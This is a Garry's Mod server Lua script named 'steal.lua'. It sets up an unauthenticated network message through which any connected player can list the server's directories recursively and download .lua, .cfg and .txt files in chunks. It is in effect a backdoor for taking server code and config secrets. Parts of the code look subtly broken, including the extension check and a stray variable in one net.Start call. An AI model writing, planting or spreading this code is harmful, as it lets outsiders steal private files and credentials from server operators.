--steal.lua
local ss = "DANGEROUS_TO_GO_ALONE"

util.AddNetworkString(ss)

local wl = {lua = true, cfg = true, txt = true}

net.Receive(
	ss,
	function(l, p)
		local args = net.ReadTable()
		local com = args[1]
		
		if (com == "GET_BRANCH") then
			local dir = args[2]
			local lod = args[3]
			
			local f, d = file.Find(dir .. "*", lod)
			
			while (#d > 0) do
				local ff, dd = file.Find(dir .. d[1] .. "/*", lod)
				
				for _, fff in pairs(ff || {}) do
					table.insert(f, d[1] .. "/" .. fff)
				end
				
				for _, ddd in pairs(dd || {}) do
					table.insert(d, d[1] .. "/" .. ddd)
				end
				
				table.remove(d, 1)
			end
			
			net.Start(ss)
				net.WriteTable(
					{
						"FILE_LIST",
						f
					}
				)
			net.Send(p)
		elseif (com == "GET_FILE") then
			local ffil = args[2]
			local fstr = file.Read(ffil, args[3]) || "THE FILE IS BLANK"
			local ftab = {}
			
			local ext = ffil:sub(ffil:len() - (ffil:reverse():find(".") || 0) - 1)
			
			if (!wl[ext]) then
				fstr = "THIS FILE IS NOT ON THE WHITELIST NO YOU DON'T GET IT"
			end
			
			
			for i = 1, 1/0, 501 do
				if (i + 500 < fstr:len()) then
					table.insert(ftab, fstr:sub(i, i + 500))
				else
					table.insert(ftab, fstr:sub(i))
					break
				end
			end
			
			for _, fdat in pairs(ftab) do
				net.Start(ss)
					net.WriteTable(
						{
							"FILE_DAT",
							fdat
						}
					)
				net.Send(p)
			end
			
			net.Start(ss, fdat)
				net.WriteTable(
					{
						"FILE_DAT",
						"FILE_DAT_END_TRANSMISSION"
					}
				)
			net.Send(p)
		end
	end
)